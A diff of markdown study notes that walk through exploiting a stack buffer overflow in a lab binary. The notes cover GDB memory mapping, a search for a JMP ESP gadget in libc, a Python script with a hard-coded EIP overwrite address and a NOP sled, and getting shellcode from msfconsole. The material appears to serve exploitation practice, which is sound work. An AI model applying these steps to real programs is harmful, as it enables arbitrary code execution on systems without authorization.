@@ -1,10 +1,8 @@
     https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 _____________________________________________________________________________________________________________________
 ### Run GDB against the program you want to view
-#### The disass command to see what the code is performing and the memory spaces
+#### To see if it can be broken.
     gdb func
-    info proc map
-    find /b 0xf7de2000 , 0xf7ffe000 , 0xff , 0xe4
 _____________________________________________________________________________________________________________________
 ### Create a python script to run against the program in gbd.
 #### Buffer to see when the program breaks, EIP to jump to the point in memory, nop sled to push your code into executable space in memory, print to view the output as you update the script. THIS SCRIPT IS FULLY UPDATED!
@@ -12,10 +10,6 @@ ________________________________________________________________________________
     
     #eip = "BBBB"
     eip = "\x59\x3b\xde\xf7"
-    
-    #0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\xf7"
-    #0xf7f588ab "\xf7\xf5\x88\xab" "\xab\x88\xf5\xf7"
-    #0xf7f645fb "\xf7\xf6\x45\xfb" "\xfb\x45\xf6\xf7"
     
     nop = '\x90' * 5
     
@@ -35,11 +29,14 @@ ________________________________________________________________________________
     show env
     unset env LINES
     unset env COLUMNS
+    run
+    info proc map
+    find /b 0xf7de2000 , 0xf7ffe000 , 0xff , 0xe4
 _____________________________________________________________________________________________________________________
 ### Open gdb against the program func
 #### This is for testing the script continuously as you UPDATE IT.
     gdb func
-    run <<< $(python test.py)                     #The name of the script is test.py
+    run <<< $(python test.py)
 _____________________________________________________________________________________________________________________
 ### Run msfconsole to get the shellcode to run the command in the script.
 #### step will take several attempts of running the last command and pasting into script.
